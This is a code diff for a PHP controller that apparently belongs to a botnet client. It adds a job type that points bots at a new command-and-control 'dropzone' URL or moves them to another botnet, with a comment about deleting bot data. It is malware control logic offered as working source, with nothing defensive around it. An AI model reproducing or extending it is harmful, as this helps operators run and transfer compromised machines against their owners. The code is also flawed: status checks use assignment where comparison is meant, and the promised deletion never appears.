@@ -582,24 +582,48 @@ class Process_control extends CI_Controller {
 
                 /*
                  * If the job is a Dropzone change, process is here
-                 * Looks for jobs with an output of '10'
+                 * Looks for jobs with an output of '10' or '12'
+                 * 
+                 * 10 = change dropzone url
+                 * 12 = move to another botnet entirely; delete bot, apps, data
                  */ 
                 
-                if ($job_output == 10) // If a change to the dropzone setting
+                if ($job_output == 10 OR $job_output == 12) // If a change to the dropzone setting
                 {
                     /*
                      * Process a change to the Dropzone
                      */
 
-                    // Update DB
-                    $this->dropzone_model->updateDropzoneURL($job_cmd);
-                                  
-                    
-                    // Update the downloaded job as 'retrieved'
-                    $this->_updateDownloadedJob($url, $job_id, $bot_key, '99');
-                    
-                    // Log action
-                    $this->log_model->log_action($bot_key,'550','Dropzone change has been completed');
+                    if ($job_output == 10)
+                    {
+                        /*
+                         * Dropone url change only
+                         */
+                        
+                        // Update DB
+                        $this->dropzone_model->updateDropzoneURL($job_cmd);
+
+                        // Update the downloaded job as 'retrieved'
+                        $this->_updateDownloadedJob($url, $job_id, $bot_key, '99');
+
+                        // Log action
+                        $this->log_model->log_action($bot_key,'550','Dropzone change has been completed');                        
+                    }
+                    if ($job_output == 12)
+                    {
+                        /*
+                         * Move to another botnet
+                         */
+                        
+                        // Update DB
+                        $this->dropzone_model->updateDropzoneURL($job_cmd);
+                        
+                        // Update the downloaded job as 'retrieved'
+                        $this->_updateDownloadedJob($url, $job_id, $bot_key, '100');
+
+                        // Log action
+                        $this->log_model->log_action($bot_key,'550','Dropzone move has been completed');                        
+                    }
                     
                 } else {
                     /*
@@ -659,7 +683,7 @@ class Process_control extends CI_Controller {
         $status = $xml->job[0]->status;
 
         // If record has been successfully updated
-        if ($status == 2 OR $status == 9 OR $status == 1 OR $status = 99) { 
+        if ($status == 2 OR $status == 9 OR $status == 1 OR $status = 99 OR $status = 100) { 
             // Log action
             $this->log_model->log_action($botkey,'401','Updated downloaded job_id: '.$id.' as retrieved.');
         } else {
